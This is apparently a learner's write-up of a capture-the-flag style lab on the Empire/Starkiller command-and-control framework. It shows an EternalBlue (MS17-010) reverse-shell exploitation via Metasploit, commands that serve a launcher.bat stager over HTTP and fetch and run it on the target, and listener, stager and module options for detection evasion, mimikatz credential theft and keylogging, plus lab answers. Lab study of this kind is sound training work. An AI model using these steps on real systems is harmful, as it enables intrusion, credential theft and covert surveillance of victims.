Learn how to use Empire and it's GUI Starkiller, a powerful post-exploitation C2 framework.

 Empire, a C2 or Command and Control server created by BC-Security, used to deploy agents onto a device and remotely run modules. Empire is a free and open-source alternative to other command and control servers like the well known Cobalt Strike C2.
 

**Empire:Empire, a C2 or Command and Control server created by BC-Security, used to deploy agents onto a device and remotely run modules. Empire is a free and open-source alternative to other command and control servers like the well known Cobalt Strike C2.**

this new to me i don’t know about Empire So need to do some stuff like research on it

Let’s Scan Network First to Get Name Of Vuln Of Target..



```bash
nmap --script vuln <ip_addr> 
```

```bash
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

```

Yes I got the name  : **ms17–010!**


## **#2 — Exploit the vulnerability to spawn a reverse shell!**

First of all, you need to start msfconsole.

After that as I did machine  Blue so i got the exploit :)


**use exploit/windows/smb/ms17_010_eternalblue**

**set payload /windows/x64/shell/reverse_tcp**

When you set the payload successfully you need to see the options available to you.

run the **show options** command / or just **options** (I prefer it).

Change **Rhosts** to { machine_ip }

Change **Lhost** to your {machine_ip}

Change **Rport** to {your_choice}

Run the exploit with the **exploit** command!
 <img width="1745" height="412" alt="image" src="https://github.com/user-attachments/assets/00a3c772-a453-4a2a-a35a-9e520b3770d6" />


# **Install**

It was the first time i used the Empire framework, so i did some reading about it and so should you. It is very interesting for anyone who has never used it before.

When you feel ready, the first thing you need to do of course is to install it.

1 — Open your terminal and go to **opt** directory { **cd /opt** }.

2 —When you are inside **opt** copy this git command to get the repository locally **git clone [https://github.com/BC-SECURITY/Empire/](https://github.com/EmpireProject/Empire).**3 — When you successfully download it enter the directory **cd /opt/Empire**4 — When you successfully enter the directory, simply enter this command to start installing in into your system **./setup/install.sh.**5 —When prompted, enter in a server negotiation password. This can be left blank for random generation, however, you should record this somewhere such as a LastPass vault. I just entered a password i commonly use, just to be sure that i am going to be able to remember it.6 — Launch Empire with either **./empire** or **/opt/Empire/empire**

now Somethings i need to learn 

<img width="1902" height="682" alt="Screenshot 2025-08-12 190534" src="https://github.com/user-attachments/assets/1870b4a8-1ac1-4471-a18a-f317555c20b1" />


Now that we have Empire and Starkiller installed and running we can take a brief tour of the GUI to see some of the main features Empire has to offer. You will notice six different main tabs that you will interact with the most each one is outlined below.

- Listeners - Similar to Netcat or multi/handler for receiving back stagers.
- Stagers - Similar to a payload with further functionality for deploying agents.
- Agents - Used to interact with agents on the device to perform "tasks".
- Modules - Modules that can be used as tools or exploits.
- Credentials - Reports all credentials found when using modules.
- Reporting - A report of every module and command run on each agent.

## Task:4

# Listeners Overview

Listeners are used in Empire similar to how they are used in any other normal listener like Netcat and multi/handler. These listeners can have some very useful functionality that can help with agent management as well as concealing your traffic / evading detections. Below you can find an outline of the available listeners and their uses.

- http - This is the standard listener that utilizes HTTP to listen on a specific port.

The next four commands use variations of HTTP COMs to generate a listener, this is out of scope for this room; however, I encourage you to do your own research on HTTP COMs and how they can be used to conceal traffic.

- http_com - Uses the standard HTTP listener with an IE COM object.
- http_foreign - Used to point to a different Empire server.
- http_hop - Used for creating an external redirector using PHP.
- http_mapi - Uses the standard HTTP listener with a MAPI COM object.

The next five commands all use variations of built out services or have unique features that make them different from other listeners.

- meterpreter - Used to listen for Metasploit stagers.
- onedrive - Utilizes OneDrive as the listening platform.
- redirector - Used for creating pivots in a network.
- dbx - Utilizes Dropbox as the listening platform.
- http_malleable - Used alongside the malleable C2 profiles from BC-Security.

## Task :5

There is also the ability to create custom malleable c2 listeners that act as beacons to emulate certain threats or APTs however that is out of scope for this room. For more information refer to the [BC-Security blog](https://www.bc-security.org/post/empire-malleable-c2-profiles/).

The menu for creating a listener gives us many options to choose from. These option fields will change from listener to listener. Below is an outline of each field present for the HTTP listener and how they can be used and adjusted.

- Name - Specify what name the listener shows up as in the listener menu.
- Host - IP to connect back to.
- Port - Port to listen on.
- BindIP - IP to bind to (typically localhost / 0.0.0.0)

These options can be used for specifying how the listener operates and runs when started and while running.

- DefaultDelay
- DefaultJitter
- DefaultLostLimit

The following options can be useful for bypassing detection techniques and creating more complex listeners.

- DefaultProfile - Will allow you to specify the profile used or User-Agent.
- Headers - Since this is an HTTP listener it will specify HTTP headers.
- Launcher - What launcher to use for the listener this will be prefixed on the stager.

4. After pressing submit, we now have an active listener on port 4444.



## Task:6

Stagers Overview

Starkiller uses a listener and a stager to create an agent the listener does exactly as it sounds like it, it listens on a given port for a connection back from your agent. The stager is similar to a payload or reverse-shell that you would send to the target to get an agent back. There is a large number of stagers available we will only cover a handful of the stagers and their uses then use two to demonstrate their uses. Below is an outline of a handful from the possible list of stagers to choose from.

Empire has multiple parts to each stage to help identify each one. First is the platform this can include multi, OSx, and Windows. Second the stager type itself / launcher.

Below are 3 stagers that are general purpose and can be used as your basic stagers. multi/launcher is the most all-purpose stager and can be used for a variety of scenarios, this is the stager we will use for demo purposes in this room.

- multi/launcher - A fairly universal stager that can be used for a variety of devices.
- windows/launcher_bat - Windows Batch file
- multi/bash - Basic Bash Stager

You can also use stagers for more specific applications similar to the listeners. These can be anything from macro code to ducky code for USB attacks.

- windows/ducky - Ducky script for the USB Rubber Ducky for physical USB attacks.
- windows/hta - HTA server an HTML application protocol that can be used to evade AV.
- osx/applescript - Stager in AppleScript: Apple's own programming language.
- osx/teensy - Similar to the rubber ducky is a small form factor micro-controller for physical attacks.

# You need to create a payload in stager and then connect it to host machine to download though python server and then download and run the `launcher.bat` file  in host machine to get reverce access to it.
Transferring & Executing the Stager

Attacking Machine:

There are many ways that you can send the stager to the target machine, including SCP, phishing, and malware droppers; for this example, we will use a basic python3 server and wget to transfer the stager.

1. `python3 -m http.server`

Target Machine:

1. `wget TUN0_IP:8000/launcher.bat -outfile launcher.bat`

2.) `./launcher.bat`


## Task:7

# Agents Overview

Agents are used within Starkiller similar to how you would interact with a normal shell or terminal. You can run shell commands as well as modules that come pre-packaged with Empire. Different to a normal shell, with any C2 server once you have an agent connected back to the C2 server you can use any modules and not trip AV or other detections because they are run remotely. All agents have the same functionality and modules available the stager and listener only determine how the agent is sent to the device and how it connects back.

The main functions of the interaction menu you will use are again the shell commands and modules, but the menu has other features like renaming the agent, kill agent, and the ability to adjust specifics configurations of the agent from the VIEW tab this is out of scope for this room but we encourage you to take a look and explore more of this menu.

Even though this is a Windows box Empire allows the ability to run any shell commands on it such as ls, whoami, ifconfig, etc. which can be useful if you are not comfortable with the normal Windows command line syntax.

All shell commands and modules when they are run are referred to as tasks in Empire as the agent is sent out to the device to perform the task then comes back with the output.

Underneath the Execute Module section is where the output for both shell commands and modules will appear.

![](https://i.imgur.com/mZo3cRW.png)

The output will show what username on the C2 server executed the task then the output of the task. Showing the Empire username before the task can be very helpful as Empire has the capability to use multiple clients and users connected to the same server to interact with one agent.

## Task:8

# Module Overview

Modules are used in Empire as a way of packaging tools and exploits to be easily used with agents. These modules can be useful for easily compiling exploits, using tools, and bypassing anti-virus. Empire has a collection of modules as well as the ability to add plugins that act as modules

We can take a look at a few useful ones for enumeration and privilege escalation 

- Seatbelt
- Mimikatz
- WinPEAS
- etc.

Empire sorts the modules by the language used: PowerShell, python, external, and exfiltration as well as categories for modules 

- code execution
- collection
- credentials
- exfiltration
- exploitation
- lateral movement
- management
- persistence
- privesc
- google it

Using modules is pretty straightforward, you can open a user interaction menu and find the module you want to use. Once you have the module you want to use some require that you enter some details like a command to run, listener, etc. and others you can just run straight out of the box

<img width="1616" height="282" alt="Screenshot 2025-08-12 204225" src="https://github.com/user-attachments/assets/1df0fb13-637b-43b9-9a00-37f08fd78016" />

Now time to answer the questions

What module allows you to use any mimikatz command?

Answer: powershell/credentials/mimikatz/command 

img cnd

What MITRE ATT&CK technique is associated with powershell/trollsploit/voicetroll?

Answer: T1491

What module implants a keylogger on the device?

Answer:powershell/collection/keylogger 

What MITRE ATT&CK technique is associated with the module above?

Answer:T1056

## Task: 9

# Plugins Overview

Plugins are an extension of the base set of modules that Empire comes with.  You can easily download and use community-made plugins to extend the use of Empire.

To use a plugin, transfer a plugin.py file to the /plugins directory of Empire. As an example of how to use plugins, we will be using the socks server plugin made by BC-Security, you can download it [here](https://github.com/BC-SECURITY/SocksProxyServer-Plugin).


By using this plugin, we can get a reverse connection to the target….

But it is same like Metasploit I think Metasploit is easy to use but lets see what will happen because we will explore it more…
Hope u enjoy it….

Thankyou For Reading…..
